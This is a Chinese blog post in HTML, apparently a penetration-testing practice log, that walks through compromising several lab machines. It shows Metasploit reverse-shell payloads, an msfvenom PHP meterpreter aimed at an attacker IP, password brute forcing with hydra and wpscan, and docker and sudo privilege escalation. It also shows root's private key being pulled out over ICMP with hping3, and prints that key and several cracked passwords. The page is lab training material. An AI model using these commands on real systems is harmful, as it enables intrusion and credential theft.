@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":"default","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="SunsetNoontide信息搜集 1nmap 192.168.56.109 -A -sV -p-   msf启动！ 1234567891011121314search UnrealIRCduse 0set rhosts 192.168.56.109show payloadsset payload payload&#x2F;cmd&#x2F;unix&#x2F;reverse_perlshow options...run">
+<meta property="og:type" content="article">
+<meta property="og:title" content="oscp2">
+<meta property="og:url" content="http://example.com/2023/08/11/oscp2/index.html">
+<meta property="og:site_name" content="not coder">
+<meta property="og:description" content="SunsetNoontide信息搜集 1nmap 192.168.56.109 -A -sV -p-   msf启动！ 1234567891011121314search UnrealIRCduse 0set rhosts 192.168.56.109show payloadsset payload payload&#x2F;cmd&#x2F;unix&#x2F;reverse_perlshow options...run">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230811234424.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812211640.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812213418.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812220514.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815214410.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815220155.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230826211905.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001245.png">
+<meta property="og:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001809.png">
+<meta property="article:published_time" content="2023-08-11T15:20:46.000Z">
+<meta property="article:modified_time" content="2023-08-26T16:21:46.658Z">
+<meta property="article:author" content="小zhou">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230811234424.png">
+
+<link rel="canonical" href="http://example.com/2023/08/11/oscp2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>oscp2 | not coder</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">not coder</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/11/oscp2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="not coder">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          oscp2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-11 23:20:46" itemprop="dateCreated datePublished" datetime="2023-08-11T23:20:46+08:00">2023-08-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-27 00:21:46" itemprop="dateModified" datetime="2023-08-27T00:21:46+08:00">2023-08-27</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>682</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <span id="more"></span>
+
+<h2 id="SunsetNoontide"><a href="#SunsetNoontide" class="headerlink" title="SunsetNoontide"></a>SunsetNoontide</h2><p>信息搜集</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.109 -A -sV -p-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230811234424.png"></p>
+<p>msf启动！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">search UnrealIRCd</span><br><span class="line">use 0</span><br><span class="line">set rhosts 192.168.56.109</span><br><span class="line">show payloads</span><br><span class="line">set payload payload/cmd/unix/reverse_perl</span><br><span class="line">show options</span><br><span class="line">...</span><br><span class="line">run</span><br><span class="line">shell</span><br><span class="line">whoami</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -perm -u=s -exec ls -al &#123;&#125; \; 2&gt; /dev/null</span><br><span class="line">su root</span><br><span class="line">root 弱密码登录</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<h2 id="pyexp-1"><a href="#pyexp-1" class="headerlink" title="pyexp: 1"></a>pyexp: 1</h2><p>这个靶机只能又vm 打开</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.111.131 -sV -sC -A -p-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812211640.png"></p>
+<p>没有http 服务，那就从ssh 爆破 和 mysql  爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P &quot;rockyou.txt&quot; mysql://192.168.111.131</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812213418.png"></p>
+<p>爆破出来密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prettywoman</span><br></pre></td></tr></table></figure>
+
+<p>gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys&#x3D;</p>
+<p>密钥：UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0&#x3D;</p>
+<p><a target="_blank" rel="noopener" href="https://cryptography.io/en/latest/fernet/#cryptography.fernet.Fernet">Fernet (symmetric encryption) — Cryptography 42.0.0.dev1 documentation</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">打开python3终端一次输入</span><br><span class="line">from cryptography.fernet import Fernet</span><br><span class="line">key = b&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span><br><span class="line">f = Fernet(key)</span><br><span class="line">token =b&#x27;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&#x27;</span><br><span class="line">f.decrypt(token)</span><br><span class="line">b&#x27;lucy:wJ9`&quot;Lemdv9[FEw-&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230812220514.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh lucy@192.168.111.131 -p 1337</span><br><span class="line">sudo /usr/bin/python2 /opt/exp.py</span><br><span class="line">sudo -l</span><br><span class="line">sudo /usr/bin/python2 /opt/exp.py</span><br><span class="line">import pty;pty.spawn(&#x27;/bin/bash&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Btrsys-2"><a href="#Btrsys-2" class="headerlink" title="Btrsys-2"></a>Btrsys-2</h2><p>信息搜集，发现wordpress</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.111.132/wordpress -e u</span><br></pre></td></tr></table></figure>
+
+<p>枚举用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin admin 弱口令直接进入</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.111.128 LPORT=4444 -f raw &gt; ./shell.php</span><br></pre></td></tr></table></figure>
+
+<p>弹不出来，歇菜</p>
+<p>下一个</p>
+<h2 id="pwned1"><a href="#pwned1" class="headerlink" title="pwned1"></a>pwned1</h2><p>信息搜集</p>
+<p>发现ftp 服务，但是好像匿名登录不了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -r -u http://192.168.56.110/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 100 -e</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hidden_text/secret.dic</span><br><span class="line">/pwned.vuln/</span><br><span class="line">查看源码即可看到登录账号密码</span><br></pre></td></tr></table></figure>
+
+<p>登录后在用户下发现，id_rsa 登录</p>
+<p>然后赋予权限登录，sudo -l,看到这个文件，(selena) NOPASSWD: &#x2F;home&#x2F;messenger.sh</p>
+<p>这个显然是有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">clear</span><br><span class="line">echo &quot;Welcome to linux.messenger &quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;$users&quot;</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter username to send message : &quot; name </span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">read -p &quot;Enter message for $name :&quot; msg</span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Sending message to $name &quot;</span><br><span class="line"></span><br><span class="line">$msg 2&gt; /dev/null</span><br><span class="line"></span><br><span class="line">                echo &quot;&quot;</span><br><span class="line">echo &quot;Message sent to $name :) &quot;</span><br><span class="line">                echo &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u selena /home/messenger.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815214410.png"></p>
+<h3 id="docker-提权"><a href="#docker-提权" class="headerlink" title="docker 提权"></a>docker 提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br><span class="line">docker run -v /:/mnt  -it alpine</span><br><span class="line">cd/ mnt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230815220155.png"></p>
+<h2 id="funbox"><a href="#funbox" class="headerlink" title="funbox"></a>funbox</h2><p>列举用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/  -e u</span><br><span class="line">admin joe</span><br></pre></td></tr></table></figure>
+
+<p>爆破密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://funbox.fritz.box/ -U admin -P /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>admin : iubire</p>
+<p>joe : 12345</p>
+<p>ssh登录 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i 绕过rbash</span><br></pre></td></tr></table></figure>
+
+<p>cd &#x2F;funny下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现 ./backup.sh 可以写入</span><br><span class="line">reminder 提示他是个定时文件写入反弹shell</span><br><span class="line">监听，多试几次</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230826211905.png"></p>
+<h2 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h2><p>信息搜集啥也没有</p>
+<p>看一眼网页</p>
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001245.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">searchsploit monitorr</span><br><span class="line">searchsploit -p php/webapps/48980.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shell.php http://192.168.56.113/mon 192.168.56.105 4444</span><br></pre></td></tr></table></figure>
+
+<p>得到shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -alh devel/ </span><br><span class="line"> cat crypt.php&lt;?phpecho crypt(&#x27;BUHNIJMONIBUVCYTTYVGBUHJNI&#x27;,&#x27;da&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个即是fox 的密码BUHNIJMONIBUVCYTTYVGBUHJNI</p>
+<p>登路 sudo -l</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用hping3读取root用户的私钥文件</span><br></pre></td></tr></table></figure>
+
+<p>连接两个ssh 终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#发送端</span><br><span class="line">sudo -u root hping3 --icmp 127.0.0.1 --data 5000 --sign signature --file /root/.ssh/id_rsa</span><br><span class="line">​</span><br><span class="line">#接收端</span><br><span class="line">sudo -u root hping3 --icmp 127.0.0.1 --listen signature --safe</span><br></pre></td></tr></table></figure>
+
+<p>保存为id_rsa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAqcCz/pKzjVNZi9zdKJDkvhMhY8lOb2Qth8e/3bLJ/ssgmRLoJXAQ</span><br><span class="line">sGF3lKw7MFJ4Kl6mrbod2w8EMfULTjW6OhwZ8txdNmTDkbof4irIm93oQgrqMy8/2GwF/k</span><br><span class="line">Sf84k8Yem6gRUhDDnYcKLF2Q2mBJW9WRSDImYVkZX8n/30GrUpHN7cVGCsKsuTxfZI4n3E</span><br><span class="line">fj90y0zlpUgtpdVAtOcYfhR6tXsuoKfPCD8H0N/0XEKVAHaQGWkL/EAGQqPuqGMTGLv62y</span><br><span class="line">lL8bpVdeAaol6aJdxAT3aglxOcuhdgHFAPVHeojGtIaNmpiPq0fIWZtV3gJiSRum7GBGUR</span><br><span class="line">+aWhN6ZEnn7WuOuOjibtULNadnIEyPP7xplEcoHWeeDvM060MtLx1ojv8eg23bAvd/ppsy</span><br><span class="line">UiOw2/AJGd5HnRH9yFZCXzJ+bga6oV2SH95B/pfBc0sKD5In/r4CFW+NTUH5Z3iX2dQZdo</span><br><span class="line">QnKiZjKK4aAsLcjLX3VzANr7WO6RLanxAffL0xFxAAAFiEC+3VBAvt1QAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAKnAs/6Ss41TWYvc3SiQ5L4TIWPJTm9kLYfHv92yyf7LIJkS6CVwELBhd5SsOzBS</span><br><span class="line">eCpepq26HdsPBDH1C041ujocGfLcXTZkw5G6H+IqyJvd6EIK6jMvP9hsBf5En/OJPGHpuo</span><br><span class="line">EVIQw52HCixdkNpgSVvVkUgyJmFZGV/J/99Bq1KRze3FRgrCrLk8X2SOJ9xH4/dMtM5aVI</span><br><span class="line">LaXVQLTnGH4UerV7LqCnzwg/B9Df9FxClQB2kBlpC/xABkKj7qhjExi7+tspS/G6VXXgGq</span><br><span class="line">JemiXcQE92oJcTnLoXYBxQD1R3qIxrSGjZqYj6tHyFmbVd4CYkkbpuxgRlEfmloTemRJ5+</span><br><span class="line">1rjrjo4m7VCzWnZyBMjz+8aZRHKB1nng7zNOtDLS8daI7/HoNt2wL3f6abMlIjsNvwCRne</span><br><span class="line">R50R/chWQl8yfm4GuqFdkh/eQf6XwXNLCg+SJ/6+AhVvjU1B+Wd4l9nUGXaEJyomYyiuGg</span><br><span class="line">LC3Iy191cwDa+1jukS2p8QH3y9MRcQAAAAMBAAEAAAGAAiBk4NqLn0idBZCFwL1X8D2jHH</span><br><span class="line">HoJqMVou7Qq4FS4HtA9En1WIq32s3NxrIFp8xQrw8yfVioiRb+EXYlZxxrMdEqTg2OqWDH</span><br><span class="line">xmqTfazViIZWI4Wpe2yrGxX3WUEY098zP3LDIFzYZiPPX1HasqZmHwaVMal9HxAyUvmTCZ</span><br><span class="line">oP1cnRMwhjsDbp0TttpXw5W4UB0icPWoCjG9f0onAyeFGwz9uH0gAyDFct08eeXHKByCoZ</span><br><span class="line">XcEeewMC4G0Y5vrQwZFEJcEP7+FES0RHCT8itoeC51t4HOtHLX5BKcApf8cAp3LK8alEl3</span><br><span class="line">lJfLklX2Rm8v9l4RjWxxAgFpmY5o4PeXLeKP6/35VewAmMwNiZ17J/MOUMsj/2SCNxYh7Z</span><br><span class="line">LmIIL9B65ipd/L7RXSbFhpGbT6jyOYzDI8D6VGwCEhMiVITntyh5YvimgZTzlP3zmTsxX5</span><br><span class="line">lmyAn/RIJ6tXnXIkmGw1QjHfS0eI5ny+vR8SlmDnTlF1LFk65+qY42sWWeVweP4tkxAAAA</span><br><span class="line">wDvG1aNPq532hZw+P5NzrocyRSu4GfmygSpZY13OTtKGPDjQMPwABPYFOYS/cul0i9mpS1</span><br><span class="line">SeBllnDJbEwM3/iH6k/YlEuT7tIKeRbx/8MTAjkCO0sBWyA4k3tFbupsZu2/jWOxrcUgeH</span><br><span class="line">1833FdCX/EyAzBDirDopqYmR77SDERqOYLbwgv6r2J6rj4FboRemx2T1XRo+DJOczlU0yJ</span><br><span class="line">vTKQRbCFe3+Z5ZYkMg3SCvMsbu1vj+f9pu0uG84s3R3FFGYAAAAMEA0aLIF8pXABXUD+60</span><br><span class="line">bIXpizYMoodJHl02C17wBjMWVzEYah6Vq+ZvoOvqMISkeIIhDUf8jwgaFVYkv/Nr33qmSN</span><br><span class="line">FsEms4d8vJ9c8MFWykmxvmSwVh26G0DQxlASZ3exgyqmnCl9LSGwY0W4brH6nOrKRBKDTH</span><br><span class="line">xeMBxuxNdkfU6ABy5NbrSmMnQP/bLozC1GJlyB4TAvvK/PH29L8ncSzsx9KimV4eM3fv1j</span><br><span class="line">5x+VwcOnMnbzg8F1RrA5O6xJfYMnQVAAAAwQDPS88AHHxqwqg2LocOLQ6AVyqDB6IRDiDV</span><br><span class="line">mI4KG5dALS8EnHGmObVhx6qiwi09X666eDen2G/W1bVc8X9lyJVVtKEdOhLrizkPAqY3wW</span><br><span class="line">9V/kC7S2DX0aDYpVyZTSpeV63SPHCrN1jryAQMMgz+CswS7/sIqEUAPNqMAxzoziR3WBIG</span><br><span class="line">qEx5FmhFueiELGZjVJiEPAWbbsFRdskr4eYfhJ+bz91G5aJXpIJqsNw829TOXf/3439Rix</span><br><span class="line">q/qSihL6WLsu0AAAAQcm9vdEBjYWxpcGVuZHVsYQECAw==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/11/oscp2/QQ%E6%88%AA%E5%9B%BE20230827001809.png"></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>三天饿九顿，讨点饭吃。</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="小zhou 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="小zhou 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/08/ctfshow%E8%B7%B3%E6%9D%BF%E6%9C%BA/" rel="prev" title="ctfshow跳板机">
+      <i class="fa fa-chevron-left"></i> ctfshow跳板机
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
